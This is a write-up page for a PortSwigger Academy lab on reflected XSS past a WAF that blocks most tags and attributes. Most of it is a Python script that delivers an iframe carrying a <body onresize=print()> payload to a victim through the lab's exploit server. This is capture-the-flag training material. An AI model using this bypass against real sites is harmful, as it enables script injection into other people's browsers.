@@ -1,0 +1,96 @@
+---
+title: 'XSS Lab 14'
+description: 'Bypassing WAF restrictions to achieve JavaScript execution with print()'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## Reflected XSS into HTML context with most tags and attributes blocked
+
+<div style="text-align: justify;">
+  This lab demonstrates a reflected cross-site scripting (XSS) vulnerability where a Web Application Firewall (WAF) blocks common tags and attributes. The challenge is to find a non-blocked HTML element and event handler that can be used to trigger the `print()` function without requiring user interaction. The solution relies on using the `<body>` tag with the `onresize` event, embedded via an injected `<iframe>`, to bypass restrictions.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- The search functionality reflects unsanitized input into the HTML context.
+- Direct attempts like `<img src=1 onerror=print()>` are blocked by the WAF.
+- Using Burp Intruder and the PortSwigger XSS cheat sheet, the allowed HTML tags and event attributes are tested.
+- The `<body>` tag with `onresize` event bypasses the filter and can trigger `print()`.
+- Wrapping the payload inside an `<iframe>` ensures the `resize` event occurs automatically (via CSS width manipulation).
+- Delivering this payload through the exploit server causes automatic execution for the victim user.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import sys, time, requests, urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+
+def check_burp():
+    try:
+        requests.get("http://127.0.0.1:8080", timeout=3)
+    except requests.exceptions.RequestException:
+        print("[-] Start Burp (127.0.0.1:8080) and rerun"); sys.exit(1)
+
+def deliver(exploit_server, lab_url):
+    head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
+    payload = "<iframe src=\"{}/?search=%22%3E%3Cbody%20onresize=print()%3E\" onload=this.style.width='100px'>".format(lab_url)
+    data = {"responseBody": payload, "responseHead": head, "formAction":"DELIVER_TO_VICTIM",
+            "urlIsHttps":"on","responseFile":"/exploit"}
+    try:
+        r = requests.post(exploit_server, data=data, verify=False, proxies=proxies, timeout=10)
+        r.raise_for_status()
+        return True
+    except requests.exceptions.RequestException:
+        return False
+
+def check_solved(lab_url, tries=5, wait=2):
+    s = requests.Session()
+    for _ in range(tries):
+        try:
+            r = s.get(lab_url, verify=False, proxies=proxies, timeout=10)
+            if "Congratulations" in r.text or "Solved" in r.text:
+                return True
+        except requests.exceptions.RequestException:
+            pass
+        time.sleep(wait)
+    return False
+
+if __name__ == "__main__":
+    if not (2 <= len(sys.argv) <= 3):
+        print(f"Usage: python {sys.argv[0]} <lab-url> [exploit-server]"); sys.exit(1)
+
+    lab = sys.argv[1].rstrip('/')
+    if len(sys.argv) == 3:
+        exploit = sys.argv[2].rstrip('/')
+    else:
+        print("Exploit server not provided; exiting.")
+        sys.exit(1)
+
+    check_burp()
+    print(f"[*] Lab URL: {lab}")
+    print(f"[*] Exploit Server: {exploit}/")
+
+    print("[*] Delivering the exploit to the victim.. ", end="", flush=True)
+    if deliver(exploit, lab):
+        print("[+] OK")
+    else:
+        print("[-] Delivery failed"); sys.exit(1)
+
+    print("[*] Waiting a moment for the exploit to be delivered and triggered...")
+    if check_solved(lab, tries=6, wait=2):
+        print("[+] Lab solved 🎉")
+    else:
+        print("[-] Lab not confirmed as solved")
+```
